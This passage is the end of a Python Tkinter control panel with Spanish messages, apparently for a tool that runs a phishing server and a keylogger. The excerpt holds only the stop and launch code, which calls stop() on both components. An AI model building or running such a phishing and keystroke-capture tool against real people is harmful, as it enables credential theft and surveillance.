            debug_log(f"Error iniciando servidor: {e}")

    def stop_server(self):
        try:
            self.phishing_server.stop()
            self.keylogger.stop()
            self.status_var.set("Servidor detenido")
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.url_var.set("Servidor no iniciado")
        except Exception as e:
            messagebox.showerror("Error", f"Error al detener servidor: {str(e)}")
            debug_log(f"Error deteniendo servidor: {e}")

def main():
    try:
        root = tk.Tk()
        app = CybersecurityUI(root)
        root.mainloop()
    except Exception as e:
        debug_log(f"Error principal: {e}")
        messagebox.showerror("Error Crítico", f"Ha ocurrido un error crítico: {str(e)}")

if __name__ == "__main__":
    main()